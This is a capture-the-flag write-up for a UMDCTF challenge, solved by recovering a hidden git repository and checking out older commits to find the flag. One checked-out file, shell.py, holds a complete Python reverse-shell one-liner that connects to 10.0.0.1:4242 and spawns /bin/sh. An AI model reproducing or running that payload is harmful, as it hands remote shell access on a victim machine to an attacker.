# MemeCTF 2 Electric Boogaloo

## Challenge:

`9c222530fc5822720b24a18e0c5200957fcbe169589915c963e765c99c7f5f3a`

## Solution:

The string doesn’t decode into anything useful. But if we Google search for the string, we find a repository on GitHub: https://github.com/UMD-CSEC/Hmmmmmmmmmmmmmmmmmmmmmmmmm.

Examining the repository, we can find what appears to be a second repository under `old_files/data`. Let’s take a look:

```bash
$ cp -R old_files ../                                                                                                                                                                                                                                                $ cd ../old_files                                                                                                                                                                                                                                                    $ mv data .git
$ git status
On branch master
nothing to commit, working tree clean
```

If we look back through this repository, we can see a couple of commits:

```bash
$ git log
commit 3acbf91df6a99b4971243b936f04c719fa25f2e5
Author: Ben Carlisle <bencarlisle15@gmail.com>
Date:   Sat Feb 20 19:26:01 2021 -0500

    Fixed missing quote

commit 7d08573779791d779afb55b424b7326494f047e7
Author: Ben Carlisle <bencarlisle15@gmail.com>
Date:   Sat Feb 20 19:25:48 2021 -0500

    Switched format to python

commit cee06af994c3ff6cc9e8774d8ddff0a039304822
Author: Ben Carlisle <bencarlisle15@gmail.com>
Date:   Sat Feb 20 19:24:53 2021 -0500

    Init files

```

Let’s try rolling back and seeing what we can find:

```bash
$ git checkout 7d0857                                                                                                                                                                                                                                                                     master
Note: switching to '7d0857'.

You are in 'detached HEAD' state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by switching back to a branch.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -c with the switch command. Example:

  git switch -c <new-branch-name>

Or undo this operation with:

  git switch -

Turn off this advice by setting config variable advice.detachedHead to false

HEAD is now at 7d08573 Switched format to python
$ ls
shell.py
$ cat shell.py
export RHOST="10.0.0.1";export RPORT=4242;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")
```

That didn’t work, let’s try the first commit:

```bash
$ git checkout cee06a                                                                                                                                                                                                                                                                    7d08573
Previous HEAD position was 7d08573 Switched format to python
HEAD is now at cee06af Init files
$ ls                                                                                                                                                                                                                                                                                 
flag.txt
$ cat flag.txt                                                                                                                                                                                                                                                                       
UMDCTF-{f0r_th3_m3m3
```

And just like that, we found the flag: `UMDCTF-{f0r_th3_m3m3}`.
